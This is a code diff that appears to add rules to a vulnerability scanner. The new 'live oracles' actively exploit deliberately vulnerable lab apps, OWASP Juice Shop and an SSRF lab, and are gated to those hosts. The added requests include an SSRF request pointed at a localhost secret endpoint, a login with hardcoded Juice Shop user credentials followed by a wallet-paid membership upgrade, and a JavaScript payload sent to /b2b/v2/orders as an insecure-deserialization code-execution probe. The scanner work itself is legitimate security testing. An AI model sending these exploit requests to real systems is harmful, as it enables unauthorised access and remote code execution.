@@ -52919,6 +52919,26 @@ function ssrfVulnlabLabBody(html: string): string | null {
 const ssrfVulnlabBasicLiveOracle: Rule = async (ctx) => {
   if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
   const origin = ssrfVulnlabProbeOrigin(ctx);
+  const internalUrl = new URL("/basic/", origin);
+  internalUrl.searchParams.set("url", "http://127.0.0.1:8089/secret");
+  const internalDoc = await ssrfVulnlabFetchDoc(internalUrl.toString(), {
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (internalDoc.status >= 200 && internalDoc.status < 400) {
+    const internalBody = ssrfVulnlabLabBody(internalDoc.body);
+    if (internalBody && /VULNLAB\{ssrf-reached-internal-service\}/i.test(internalBody)) {
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          url: internalUrl.toString(),
+          snippet: internalBody.slice(0, 240).trim(),
+          note: "ssrf.vulnlab.dev GET /basic/?url=http://127.0.0.1:8089/secret returns internal-service flag — basic SSRF to localhost oracle"
+        }
+      };
+    }
+  }
   const probeUrl = new URL("/basic/", origin);
   probeUrl.searchParams.set("url", `${origin}/`);
   const doc = await ssrfVulnlabFetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
@@ -54922,6 +54942,132 @@ const juiceShopWalletBalanceBolaRouteLiveOracle: Rule = async (ctx) => {
       ...result.evidence,
       scannedUrl: pageUrl,
       note: "Juice Shop /rest/wallet/balance route scan — alg:none JWT returns wallet balance JSON — route-specific wallet BOLA oracle"
+    }
+  };
+};
+
+const JUICE_SHOP_DELUXE_PROBE = { email: "jim@juice-sh.op", password: "ncc-1701" } as const;
+
+async function juiceShopDeluxeProbeToken(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/rest/user/login", ctx.origin).toString();
+  const doc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify(JUICE_SHOP_DELUXE_PROBE),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  if (HEROKU_STUB_RE.test(doc.body)) return null;
+  return doc.body.match(/"token"\s*:\s*"([^"]+)"/)?.[1] ?? null;
+}
+
+const juiceShopDeluxeMembershipLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const token = await juiceShopDeluxeProbeToken(ctx);
+  if (!token) return NEGATIVE;
+  const url = new URL("/rest/deluxe-membership", ctx.origin).toString();
+  const statusDoc = await ctx.probe.get(url, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${token}` }
+  });
+  if (statusDoc.status < 200 || statusDoc.status >= 300) return NEGATIVE;
+  const costMatch = statusDoc.body.match(/"membershipCost"\s*:\s*(\d+)/);
+  if (!costMatch) return NEGATIVE;
+  const upgradeDoc = await ctx.probe.get(url, {
+    method: "POST",
+    body: JSON.stringify({ paymentMode: "wallet" }),
+    headers: {
+      Authorization: `Bearer ${token}`,
+      "Content-Type": "application/json"
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (upgradeDoc.status < 200 || upgradeDoc.status >= 300) return NEGATIVE;
+  if (
+    !/deluxe member/i.test(upgradeDoc.body) &&
+    !/"role"\s*:\s*"deluxe"/i.test(upgradeDoc.body)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url,
+      membershipCost: costMatch[1],
+      snippet: upgradeDoc.body.slice(0, 180).trim(),
+      note: "Juice Shop GET/POST /rest/deluxe-membership lets wallet-funded users upgrade to deluxe membership — deluxe membership payment oracle"
+    }
+  };
+};
+
+const juiceShopDeluxeMembershipRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!JUICE_SHOP_HOST_RE.test(`${ctx.origin}\n${pageUrl}`)) return NEGATIVE;
+  if (!/\/(?:rest\/deluxe-membership|api\/DeluxeMembership)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await juiceShopDeluxeMembershipLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Juice Shop /rest/deluxe-membership route scan — wallet payment upgrades account to deluxe role — route-specific membership oracle"
+    }
+  };
+};
+
+const juiceShopB2bOrdersDeserializationLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const token = await juiceShopProbeLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const url = new URL("/b2b/v2/orders", ctx.origin).toString();
+  const probePayload = "(function(){return true})()";
+  const doc = await ctx.probe.get(url, {
+    method: "POST",
+    body: JSON.stringify({ orderLinesData: probePayload }),
+    headers: {
+      Authorization: `Bearer ${token}`,
+      "Content-Type": "application/json"
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  const orderNoMatch = doc.body.match(/"orderNo"\s*:\s*"([a-f0-9]{32})"/i);
+  if (!orderNoMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url,
+      orderNo: orderNoMatch[1],
+      orderLinesData: probePayload,
+      snippet: doc.body.slice(0, 160).trim(),
+      note: "Juice Shop POST /b2b/v2/orders evaluates attacker-controlled orderLinesData as JavaScript — insecure deserialization / RCE oracle"
+    }
+  };
+};
+
+const juiceShopB2bOrdersDeserializationRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!JUICE_SHOP_HOST_RE.test(`${ctx.origin}\n${pageUrl}`)) return NEGATIVE;
+  if (!/\/b2b\/v2\/orders\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await juiceShopB2bOrdersDeserializationLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Juice Shop /b2b/v2/orders route scan — orderLinesData JavaScript evaluated server-side — route-specific insecure deserialization oracle"
     }
   };
 };
@@ -65657,6 +65803,10 @@ export const RULES: Record<string, Rule> = {
   juiceShopSecurityQuestionUserRouteLiveOracle,
   juiceShopWalletBalanceBolaLiveOracle,
   juiceShopWalletBalanceBolaRouteLiveOracle,
+  juiceShopDeluxeMembershipLiveOracle,
+  juiceShopDeluxeMembershipRouteLiveOracle,
+  juiceShopB2bOrdersDeserializationLiveOracle,
+  juiceShopB2bOrdersDeserializationRouteLiveOracle,
   juiceShopChatbotRespondRouteLiveOracle,
   juiceShopRecyclesBolaLiveOracle,
   juiceShopRecyclesBolaRouteLiveOracle,
